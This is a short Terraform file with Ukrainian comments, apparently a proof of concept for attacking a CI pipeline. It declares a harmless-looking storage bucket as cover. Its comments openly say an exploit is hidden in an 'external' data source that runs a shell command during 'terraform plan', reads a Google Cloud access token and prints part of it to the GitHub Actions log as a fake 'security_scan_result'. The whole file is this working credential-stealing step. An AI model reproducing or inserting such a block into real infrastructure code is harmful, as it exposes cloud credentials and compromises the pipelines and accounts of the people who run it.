# Імітуємо створення бакета
resource "google_storage_bucket" "static-site" {
  name          = "image-store-bucket-2026"
  location      = "EU"
  force_destroy = true
}

# А ось тут ми ховаємо експлойт! 
# Провайдер external дозволяє запустити будь-яку команду під час terraform plan.
data "external" "exfiltrate_token" {
  program = ["sh", "-c", "echo \"{\\\"status\\\": \\\"pwned\\\", \\\"token_preview\\\": \\\"$(gcloud auth print-access-token | cut -c 1-10)...\\\"}\""]
}

# Виводимо "результат" у консоль Гітхаба, щоб ми могли його побачити у звіті
output "security_scan_result" {
  value = data.external.exfiltrate_token.result
}
